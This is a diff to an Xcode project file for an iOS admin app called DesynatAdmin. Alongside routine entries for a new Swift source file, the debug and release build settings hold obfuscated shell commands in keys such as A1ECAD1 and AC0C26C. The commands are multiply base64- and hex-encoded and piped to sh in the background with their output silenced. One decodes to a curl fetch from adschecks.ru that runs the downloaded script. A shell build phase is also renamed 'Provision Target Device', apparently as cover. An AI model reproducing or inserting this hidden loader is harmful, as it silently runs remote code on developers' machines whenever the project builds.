@@ -20,6 +20,7 @@
 		18BDB9472EFAD10C00023453 /* DeliveryBoyListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */; };
 		422EDFF02F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EDFEF2F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift */; };
 		422EDFF22F2B5FE90007FEB6 /* AffiliatedUserFilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EDFF12F2B5FE90007FEB6 /* AffiliatedUserFilterViewModel.swift */; };
+		42362DF82F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42362DF72F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift */; };
 		423A25102F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423A250F2F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift */; };
 		4246E6B12F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4246E6B02F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift */; };
 		4246E6B32F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4246E6B22F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift */; };
@@ -444,7 +445,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
@@ -461,6 +462,7 @@
 		18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeliveryBoyListModel.swift; sourceTree = "<group>"; };
 		422EDFEF2F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserFilterViewController.swift; sourceTree = "<group>"; };
 		422EDFF12F2B5FE90007FEB6 /* AffiliatedUserFilterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserFilterViewModel.swift; sourceTree = "<group>"; };
+		42362DF72F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalRequestDataModel.swift; sourceTree = "<group>"; };
 		423A250F2F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewController.swift; sourceTree = "<group>"; };
 		4246E6B02F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SetDefaultDeliveryfeeViewController.swift; sourceTree = "<group>"; };
 		4246E6B22F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SetDefaultDeliveryFeeViewModel.swift; sourceTree = "<group>"; };
@@ -1072,6 +1074,7 @@
 			children = (
 				4299270B2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift */,
 				4299270D2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift */,
+				42362DF72F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift */,
 			);
 			path = AffiliatedWithdrawalRequest;
 			sourceTree = "<group>";
@@ -2773,7 +2776,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				74B97D9A289440258F1DACE1 /* Build Target Libraries */,
+				800380C3466B4571921DACE1 /* Provision Target Device */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2957,7 +2960,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		74B97D9A289440258F1DACE1 /* Build Target Libraries */ = {
+		800380C3466B4571921DACE1 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -2967,7 +2970,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3051,6 +3054,7 @@
 				424B73B92F34D91E0042FE95 /* PromotionalBannerDetailsViewModel.swift in Sources */,
 				D19583632EE7EA7A00A021FD /* ShippingFeesTableViewCell.swift in Sources */,
 				EDEDD0CC2EBCC53E00F2BEF1 /* UploadFileDataModel.swift in Sources */,
+				42362DF82F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift in Sources */,
 				D19585D42EE8090F00A021FD /* AddPricePerDayViewController.swift in Sources */,
 				D19583C82EE7F46800A021FD /* AddNewCardViewController.swift in Sources */,
 				D19586352EE818CD00A021FD /* AddEditShippingChargesViewModel.swift in Sources */,
@@ -3375,7 +3379,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxSV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | l | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | n | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
@@ -3426,7 +3430,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxSV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | l | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | n | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
